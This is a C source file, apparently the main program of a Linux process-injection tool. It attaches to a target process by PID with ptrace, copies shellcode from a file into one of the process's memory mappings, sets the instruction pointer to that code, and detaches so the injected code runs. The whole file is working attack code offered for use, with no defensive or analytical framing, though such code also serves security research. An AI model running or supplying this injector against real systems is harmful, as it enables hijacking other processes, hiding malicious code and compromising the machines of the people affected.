#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <errno.h>

#include "utils.h"
#include "injector.h"

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        fprintf(stderr, "Usage:\t %s PID [shellcode.bin]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    unsigned int MaxPIDValue = retrieve_maxPID_value();
    unsigned int AttachPID = _atoi(argv[1]);
    unsigned char *buffer;
    size_t len_buffer;

    size_t ret = file2buf(argv[2], &buffer, &len_buffer);
    
    info("Max PID value: %d\n", MaxPIDValue);
    warn("Target PID %d\n", AttachPID);

    if (AttachPID == 0 || AttachPID > MaxPIDValue)
    {
        perror("The proccess ID is not valid!");
        exit(EXIT_FAILURE);
    }

    if (ptrace_attach(AttachPID))
    {
        perror("Failed to attach to the process!");
        exit(EXIT_FAILURE);
    }

    struct user_regs_struct *save_registers = ptrace_getregs(AttachPID);

    proc_maps_t *proc_info = proc_mappings(AttachPID);
    if(!proc_info){
        free(save_registers);
        exit(EXIT_FAILURE);
    }

    ptrace_poketext(AttachPID, proc_info->address, (unsigned long *) buffer, len_buffer);

    info("proc_maps_t: \n    long address %p\n    uint8_t permissions: %d\n", proc_info->address, proc_info->permissions);

    struct user_regs_struct regs;

    _memcpy(&regs, save_registers, sizeof(struct user_regs_struct));
    regs.rip = proc_info->address+2;
    
    if(ptrace_setregs(AttachPID, &regs) < 0) 
        exit(EXIT_FAILURE);

    
    info("Registers:\n    RIP: %p\n    RSP: %p\n", regs.rip, regs.rsp);

    info("Code injected and executed successfully.\n");
    
    /* Restart the stopped tracee process. */
    if(ptrace(PTRACE_DETACH, AttachPID, NULL, NULL) < 0){
        perror("Error on restart the stopped tracee process!");
        exit(EXIT_FAILURE);
    }


    free(save_registers);
    free(proc_info);

    return EXIT_SUCCESS;
}
